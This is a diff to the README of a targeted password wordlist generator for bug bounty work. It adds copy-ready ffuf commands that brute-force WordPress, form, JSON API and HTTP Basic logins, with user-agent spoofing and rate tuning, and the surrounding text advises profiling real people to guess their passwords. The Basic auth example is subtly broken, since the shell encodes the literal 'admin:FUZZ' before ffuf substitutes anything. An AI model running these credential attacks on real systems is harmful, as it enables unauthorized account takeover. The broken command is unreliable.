@@ -22,7 +22,7 @@ A customizable password wordlist generator for bug bounty hunters and security p
 
 - Template-based password generation: `{word}`,`{Word}`,`{word1}{Word2}`, `{number}`, `{special}`
 - Recursively flattens data structures
-- Converts dates like `YYYY-MM-DD` to multiple formats (`YYYY`, `YY`, `MMDD`, etc.)
+- Converts dates like `YYYY-MM-DD` to multiple formats (`YYYY`, `YY`, `DDMM`, etc.)
 - Icelandic accent normalization (`þ`, `ð`, `æ`)
 - Case variants: lowercase, capitalized
 - **Filtering**: Length limits, uniqueness checks, and exclusion rules keep lists concise
@@ -81,7 +81,7 @@ If you have generic usernames but don’t know the actual user:
   site:target.is intext:"<person name>"
   ```
 
-- If no strong leads are identified, try generic password lists (seasons, numeric sequences, company-related terms) or popular wordlists. See Resources below.
+- If no strong leads are identified, try generic password lists (seasons, numeric sequences, company-related terms) or popular wordlists.
 
 ### Finding Emails
 
@@ -108,7 +108,7 @@ If you only have a person’s first name as the username:
   intext:"<person name>" intext:"<company name>"
   ```
 
-- If unsuccessful, revert to generic wordlists and temporary passwords.
+- If unsuccessful, revert to generic wordlists.
 
 ## Gathering Personal Information
 
@@ -165,6 +165,50 @@ Once you have a username and full name, gather additional personal details for t
 Follow this structured approach thoroughly to maximize the chances of discovering valid login credentials and related password information.
 
 If your generated lists become too extensive, consider defining rules under excluded_word_combinations to skip unlikely combinations, such as multiple seasons (e.g., summer, winter, autumn, spring), since typically only one season is used.
+
+## Using Generated Wordlists with ffuf
+
+Once you've generated a targeted wordlist, you can use it with ffuf for various attack scenarios:
+
+### WordPress Login Brute Force
+
+```bash
+# Basic WordPress login
+ffuf -w wordlist.txt:FUZZ -X POST -d "log=admin&pwd=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://target.com/wp-login.php -fs 1234
+
+# WordPress with custom headers
+ffuf -w wordlist.txt:FUZZ -X POST -d "log=admin&pwd=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" -u https://target.com/wp-login.php -mc 302
+```
+
+### Generic Login Forms
+
+```bash
+# Standard login form
+ffuf -w wordlist.txt:FUZZ -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://target.com/login -fc 200
+
+# JSON API login
+ffuf -w wordlist.txt:FUZZ -X POST -d '{"username":"admin","password":"FUZZ"}' -H "Content-Type: application/json" -u https://target.com/api/login -mr "success|token"
+```
+
+### HTTP Basic Authentication
+
+```bash
+# Basic auth with custom wordlist
+ffuf -w wordlist.txt:FUZZ -u https://target.com/admin -H "Authorization: Basic $(echo -n 'admin:FUZZ' | base64)" -mc 200
+```
+
+### Advanced ffuf Options
+
+```bash
+# Rate limiting and custom user agent
+ffuf -w wordlist.txt:FUZZ -X POST -d "log=admin&pwd=FUZZ" -u https://target.com/wp-login.php -p 0.5 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -t 10
+
+# Multiple wordlists (usernames + passwords)
+ffuf -w usernames.txt:USER -w wordlist.txt:PASS -X POST -d "log=USER&pwd=PASS" -u https://target.com/wp-login.php -fc 200
+
+# Output successful attempts to file
+ffuf -w wordlist.txt:FUZZ -X POST -d "log=admin&pwd=FUZZ" -u https://target.com/wp-login.php -mc 302 -o results.json -of json
+```
 
 ## (TODO) Automation Suggestions
 
